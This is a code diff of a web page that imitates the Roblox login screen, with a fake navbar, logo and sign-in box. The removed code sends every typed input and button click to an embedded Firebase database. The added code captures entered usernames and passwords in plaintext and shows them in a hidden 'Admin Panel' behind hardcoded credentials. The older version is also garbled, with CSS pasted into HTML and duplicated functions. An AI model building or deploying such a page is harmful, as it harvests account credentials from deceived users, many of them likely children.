@@ -3,13 +3,13 @@
 <head>
 
 <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-<meta name="viewport"
-content="width=device-width, initial-scale=1.0">
 <title>Roblox</title>
 
 <link rel="icon"
 href="https://www.roblox.com/favicon.ico">
+
 <style>
 
 /* RESET */
@@ -21,62 +21,43 @@ href="https://www.roblox.com/favicon.ico">
     font-family:Arial,sans-serif;
 }
 
+/* BODY */
+
 body{
-
-    background:#000;
-
+    background:black;
     color:white;
-
     overflow-x:hidden;
-
 }
 
 /* NAVBAR */
 
-<div class="navbar">
+.navbar{
 
-    <div class="nav-left">
+    width:100%;
 
-        <div class="menu-icon">
+    height:52px;
 
-            ☰
+    background:#191b1f;
 
-        </div>
+    position:fixed;
 
-        <img
-        class="logo-nav"
-        src="https://upload.wikimedia.org/wikipedia/commons/7/7e/Roblox_Logo_2022.jpg">
+    top:0;
+    left:0;
 
-        <div class="nav-links">
+    display:flex;
 
-            <a href="#">Charts</a>
+    justify-content:space-between;
 
-            <a href="#">Marketplace</a>
+    align-items:center;
 
-            <a href="#">Create</a>
+    padding:0 18px;
 
-            <a href="#">Robux</a>
+    border-bottom:1px solid #2d3138;
 
-        </div>
+    z-index:999;
+}
 
-    </div>
-
-    <div class="nav-right">
-
-        <input
-        type="text"
-        class="search-bar"
-        placeholder="Search">
-
-        <button class="signup-btn">
-
-            Sign Up
-
-        </button>
-
-    </div>
-
-</div>
+/* LEFT */
 
 .nav-left{
 
@@ -84,24 +65,94 @@ body{
 
     align-items:center;
 
-    gap:14px;
+    gap:18px;
 }
+
+/* MENU */
 
 .menu-icon{
 
-    font-size:22px;
+    font-size:24px;
+
+    color:white;
 
     cursor:pointer;
 }
 
+/* LOGO */
+
 .logo-nav{
 
-    width:78px;
+    width:90px;
 
-    height:28px;
+    height:30px;
 
     object-fit:contain;
 }
+
+/* LINKS */
+
+.nav-links{
+
+    display:flex;
+
+    align-items:center;
+
+    gap:20px;
+}
+
+.nav-links a{
+
+    color:#d7d7d7;
+
+    text-decoration:none;
+
+    font-size:15px;
+}
+
+.nav-links a:hover{
+
+    color:white;
+}
+
+/* CENTER SEARCH */
+
+.nav-center{
+
+    position:absolute;
+
+    left:50%;
+
+    transform:translateX(-50%);
+}
+
+/* SEARCH BAR */
+
+.search-bar{
+
+    width:350px;
+
+    padding:11px 18px;
+
+    border:none;
+
+    border-radius:8px;
+
+    background:#2a2f3a;
+
+    color:white;
+
+    outline:none;
+
+    font-size:14px;
+}
+
+.search-bar::placeholder{
+
+    color:#aaa;
+}
+
+/* SIGNUP */
 
 .signup-btn{
 
@@ -111,7 +162,7 @@ body{
 
     border:none;
 
-    padding:8px 16px;
+    padding:8px 18px;
 
     border-radius:8px;
 
@@ -137,7 +188,7 @@ body{
     background:
 
     linear-gradient(
-    rgba(0,0,0,0.60),
+    rgba(0,0,0,0.65),
     rgba(0,0,0,0.85)
     ),
 
@@ -148,26 +199,8 @@ body{
     background-position:center;
 
     background-repeat:no-repeat;
-
 }
 
-/* BACKGROUND EFFECT */
-
-@keyframes bgZoom{
-
-    from{
-
-        background-size:100%;
-
-    }
-
-    to{
-
-        background-size:115%;
-
-    }
-
-}
 /* LOGIN BOX */
 
 .login-box{
@@ -182,13 +215,12 @@ body{
 
     padding:35px 28px;
 
-    box-shadow:0 0 40px rgba(0,0,0,0.7);
-
     border:1px solid #2d3138;
 
-    backdrop-filter:blur(4px);
-
+    box-shadow:0 0 40px rgba(0,0,0,0.7);
 }
+
+/* TITLE */
 
 .login-box h1{
 
@@ -232,7 +264,7 @@ body{
     color:#aaa;
 }
 
-/* SHOW BUTTON */
+/* SHOW PASS */
 
 .show-pass-btn{
 
@@ -255,7 +287,7 @@ body{
     cursor:pointer;
 }
 
-/* BUTTONS */
+/* LOGIN BUTTON */
 
 .login-btn{
 
@@ -286,6 +318,8 @@ body{
 
     color:black;
 }
+
+/* EXTRA BUTTON */
 
 .secondary-btn{
 
@@ -322,6 +356,8 @@ body{
     text-decoration:none;
 }
 
+/* SIGNUP TEXT */
+
 .signup-text{
 
     margin-top:24px;
@@ -340,7 +376,7 @@ body{
     font-weight:bold;
 }
 
-/* TEXT */
+/* MESSAGE */
 
 #message{
 
@@ -351,15 +387,6 @@ body{
     color:#ff4d4d;
 }
 
-#result{
-
-    margin-top:18px;
-
-    text-align:center;
-
-    color:#00ff99;
-}
-
 /* ADMIN PANEL */
 
 #adminPanel{
@@ -367,7 +394,7 @@ body{
     display:none;
 }
 
-/* PANEL BOX */
+/* PANEL */
 
 .panel-box{
 
@@ -384,7 +411,7 @@ body{
     overflow-y:auto;
 }
 
-/* SINGLE LINE DATA */
+/* USER DATA */
 
 .activity-card{
 
@@ -399,12 +426,22 @@ body{
     font-size:14px;
 
     color:white;
+}
 
-    white-space:nowrap;
+/* MOBILE */
 
-    overflow:hidden;
+@media(max-width:950px){
 
-    text-overflow:ellipsis;
+    .nav-links{
+
+        display:none;
+    }
+
+    .search-bar{
+
+        width:220px;
+    }
+
 }
 
 </style>
@@ -413,7 +450,10 @@ body{
 <body>
 
 <!-- NAVBAR -->
+
 <div class="navbar">
+
+    <!-- LEFT -->
 
     <div class="nav-left">
 
@@ -441,160 +481,23 @@ body{
 
     </div>
 
-    <div class="nav-right">
+    <!-- CENTER SEARCH -->
+
+    <div class="nav-center">
 
         <input
         type="text"
         class="search-bar"
         placeholder="Search">
 
-        <button class="signup-btn">
-
-            Sign Up
-
-        </button>
-
     </div>
 
-</div>
-        <!-- ROBLOX LOGO -->
-
-        <img
-        class="logo-nav"
-        src="https://upload.wikimedia.org/wikipedia/commons/7/7e/Roblox_Logo_2022.jpg">
-
-    /* NAV LINKS */
-
-/* NAV LINKS */
-
-.nav-links{
-
-    display:flex;
-
-    align-items:center;
-
-    gap:20px;
-
-}
-
-.nav-links a{
-
-    color:#d7d7d7;
-
-    text-decoration:none;
-
-    font-size:15px;
-
-}
-
-.nav-links a:hover{
-
-    color:white;
-
-}
-
-/* RIGHT SIDE */
-
-.nav-right{
-
-    display:flex;
-
-    align-items:center;
-
-    gap:14px;
-
-}
-
-/* SEARCH BAR */
-
-.search-bar{
-
-    width:180px;
-
-    padding:9px 14px;
-
-    border:none;
-
-    border-radius:8px;
-
-    background:#2a2f3a;
-
-    color:white;
-
-    outline:none;
-
-}
-
-.search-bar::placeholder{
-
-    color:#aaa;
-
-}
-/* SEARCH BAR */
-
-.search-bar{
-
-    width:180px;
-
-    padding:9px 14px;
-
-    border:none;
-
-    outline:none;
-
-    border-radius:8px;
-
-    background:#2a2f3a;
-
-    color:white;
-
-}
-
-.search-bar::placeholder{
-
-    color:#aaa;
-
-}
-
-/* MOBILE */
-
-@media(max-width:850px){
-
-    .nav-links{
-
-        display:none;
-
-    }
-
-    .search-bar{
-
-        width:120px;
-
-    }
-
-}
     <!-- RIGHT -->
 
-    <div class="nav-right">
+    <button class="signup-btn">
 
-        <!-- SEARCH -->
+        Sign Up
 
-        <input
-        type="text"
-        class="search-bar"
-        placeholder="Search">
-
-        <!-- SIGN UP -->
-
-        <button class="signup-btn">
-
-            Sign Up
-
-        </button>
-
-    </div>
-
-</div>
     </button>
 
 </div>
@@ -650,7 +553,7 @@ body{
 
         </button>
 
-        <!-- FORGOT -->
+        <!-- LINKS -->
 
         <div class="links">
 
@@ -698,11 +601,7 @@ body{
 
     <div class="login-box" id="adminPanel">
 
-        <h1>
-
-            Admin Panel
-
-        </h1>
+        <h1>Admin Panel</h1>
 
         <!-- COMMAND -->
 
@@ -725,99 +624,30 @@ body{
 
         </button>
 
-        <!-- COMMANDS -->
-
-        <div class="panel-box">
-
-            <h3>Commands</h3>
-
-            <p>kick</p>
-            <p>ban</p>
-            <p>shutdown</p>
-            <p>clear</p>
-
-        </div>
-
         <!-- USER DATA -->
 
         <div class="panel-box">
 
-            <h3>
-
-                User Activity
-
-            </h3>
+            <h3>User Activity</h3>
 
             <div id="savedDataBox"></div>
 
         </div>
 
-        <p id="result"></p>
-
     </div>
 
 </div>
 
-<!-- FIREBASE -->
+<script>
 
-<script type="module">
+/* SHOW PASSWORD */
 
-import { initializeApp }
-
-from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
-
-import {
-
-    getDatabase,
-
-    ref,
-
-    push,
-
-    onValue,
-
-    remove
-
-}
-
-from "https://www.gstatic.com/firebasejs/10.12.2/firebase-database.js";
-
-/* FIREBASE */
-
-const firebaseConfig = {
-
-  apiKey: "AIzaSyA5uGGN1a_ydQILFtz1RxI1JYJF3FoKZ6U",
-
-  authDomain: "robloxadmin-5b4d1.firebaseapp.com",
-
-  databaseURL: "https://robloxadmin-5b4d1-default-rtdb.firebaseio.com",
-
-  projectId: "robloxadmin-5b4d1",
-
-  storageBucket: "robloxadmin-5b4d1.firebasestorage.app",
-
-  messagingSenderId: "1028232627372",
-
-  appId: "1:1028232627372:web:cfb765f26fc2b045a44b09",
-
-  measurementId: "G-XQXYL2DMEC"
-
-};
-
-const app = initializeApp(firebaseConfig);
-
-const db = getDatabase(app);
-
-/* SHOW/HIDE PASSWORD */
-
-window.togglePassword = function(){
+function togglePassword(){
 
     const passInput =
-
     document.getElementById("password");
 
     const btn =
-
     document.getElementById("toggleBtn");
 
     if(passInput.type === "password"){
@@ -833,101 +663,31 @@ window.togglePassword = function(){
         passInput.type = "password";
 
         btn.innerText = "Show";
-
     }
 
-};
+}
 
-/* SAVE DATA */
+/* SAVE USER DATA */
 
-window.saveActivity = function(type,data){
+function saveActivity(text){
 
-    const info = {
+    const box =
+    document.getElementById("savedDataBox");
 
-        type:type,
+    const div =
+    document.createElement("div");
 
-        data:data,
+    div.className = "activity-card";
 
-        time:new Date().toLocaleString()
+    div.innerText = text;
 
-    };
+    box.prepend(div);
 
-    /* FIREBASE */
-
-    push(
-        ref(db,"activities"),
-        info
-    );
-
-    /* LOCAL STORAGE */
-
-    let localData =
-
-    JSON.parse(
-        localStorage.getItem("backup")
-    ) || [];
-
-    localData.push(info);
-
-    localStorage.setItem(
-
-        "backup",
-
-        JSON.stringify(localData)
-
-    );
-
-};
-
-/* SHOW DATA */
-
-onValue(
-
-    ref(db,"activities"),
-
-    (snapshot)=>{
-
-        let output = "";
-
-        let items = [];
-
-        snapshot.forEach((child)=>{
-
-            items.push(child.val());
-
-        });
-
-        items.reverse();
-
-        items.slice(0,50).forEach((item)=>{
-
-            output += `
-
-            <div class="activity-card">
-
-            ${item.type}
-            |
-            ${item.data}
-            |
-            ${item.time}
-
-            </div>
-
-            `;
-
-        });
-
-        document
-        .getElementById("savedDataBox")
-        .innerHTML = output;
-
-    }
-
-);
+}
 
 /* LOGIN */
 
-window.login = function(){
+function login(){
 
     const user =
     document.getElementById("username").value;
@@ -935,60 +695,27 @@ window.login = function(){
     const pass =
     document.getElementById("password").value;
 
-    if(user.trim() === "" || pass.trim() === ""){
+    if(user === "" || pass === ""){
 
         document
         .getElementById("message")
         .innerText =
-        "Enter username and password";
+        "Enter Username and Password";
 
         return;
-
     }
 
-    /* SHOW LOGIN SAVED */
+    /* SAVE USER + PASSWORD */
 
     saveActivity(
 
-        "Login Attempt",
-
-        `USER: ${user} | PASS: ${"*".repeat(pass.length)}`
+        `USERNAME: ${user} | PASSWORD: ${pass}`
 
     );
 
     /* ADMIN LOGIN */
 
     if(user === "naman"
-    && pass === "naman"){
-
-        document
-        .getElementById("loginBox")
-        .style.display = "none";
-
-        document
-        .getElementById("adminPanel")
-        .style.display = "block";
-
-        document
-        .getElementById("message")
-        .innerText = "";
-
-    }
-
-    else{
-
-        document
-        .getElementById("message")
-        .innerText =
-        "Invalid Username or Password";
-
-    }
-
-};
-
-    /* ADMIN LOGIN */
-
-    if(user === "naman"
     && pass === "adhikari"){
 
         document
@@ -999,14 +726,6 @@ window.login = function(){
         .getElementById("adminPanel")
         .style.display = "block";
 
-        saveActivity(
-
-            "Admin Login",
-
-            user
-
-        );
-
     }
 
     else{
@@ -1015,214 +734,36 @@ window.login = function(){
         .getElementById("message")
         .innerText =
         "Invalid Username or Password";
-
     }
 
-};
-
-    /* ADMIN LOGIN */
-
-    if(user === "naman"
-    && pass === "adhikari"){
-
-        document
-        .getElementById("loginBox")
-        .style.display = "none";
-
-        document
-        .getElementById("adminPanel")
-        .style.display = "block";
-
-        saveActivity(
-
-            "Admin Login",
-
-            user
-
-        );
-
-    }
-
-    else{
-
-        document
-        .getElementById("message")
-        .innerText =
-        "Invalid Username or Password";
-
-    }
-
-};
-
-/* TRACK BUTTONS */
-
-document.addEventListener(
-
-"click",
-
-(e)=>{
-
-    if(e.target.tagName === "BUTTON"){
-
-        saveActivity(
-
-            "Button",
-
-            e.target.innerText
-
-        );
-
-    }
-
-});
-
-/* TRACK INPUT */
-
-document.addEventListener(
-
-"change",
-
-(e)=>{
-
-    if(e.target.tagName === "INPUT"){
-
-        const placeholder =
-
-        e.target.placeholder;
-
-        const value =
-
-        e.target.value;
-
-        if(value.trim() === ""){
-
-            return;
-
-        }
-
-        saveActivity(
-
-            "User Typed",
-
-            `${placeholder} : ${value}`
-
-        );
-
-    }
-
-});
+}
 
 /* COMMANDS */
 
-window.runCommand = function(){
+function runCommand(){
 
     const cmd =
-
     document
     .getElementById("commandInput")
     .value
     .toLowerCase();
 
-    const result =
+    if(cmd === "clear"){
 
-    document
-    .getElementById("result");
-
-    saveActivity(
-
-        "Command",
-
-        cmd
-
-    );
-
-    /* KICK */
-
-    if(cmd === "kick"){
-
-        result.innerText =
-        "Player kicked successfully!";
-
-    }
-
-    /* BAN */
-
-    else if(cmd === "ban"){
-
-        result.innerText =
-        "Player banned successfully!";
-
-    }
-
-    /* CLEAR */
-
-    else if(cmd === "clear"){
-
-        remove(
-            ref(db,"activities")
-        );
-
-        localStorage.clear();
-
-        result.innerText =
-        "Database cleared!";
-
-    }
-
-    /* SHUTDOWN */
-
-    else if(cmd === "shutdown"){
-
-        document.body.innerHTML = `
-
-        <div style="
-
-        height:100vh;
-
-        display:flex;
-
-        justify-content:center;
-
-        align-items:center;
-
-        flex-direction:column;
-
-        background:black;
-
-        color:red;
-
-        font-size:45px;
-
-        font-family:Arial;
-
-        ">
-
-        WEBSITE SHUTDOWN
-
-        <p style="
-        margin-top:20px;
-        font-size:20px;
-        color:white;
-        ">
-
-        Closing Website...
-
-        </p>
-
-        </div>
-
-        `;
+        document
+        .getElementById("savedDataBox")
+        .innerHTML = "";
 
     }
 
     else{
 
-        result.innerText =
-        "Unknown command!";
-
+        saveActivity(
+            "COMMAND: " + cmd
+        );
     }
 
-};
+}
 
 </script>
 
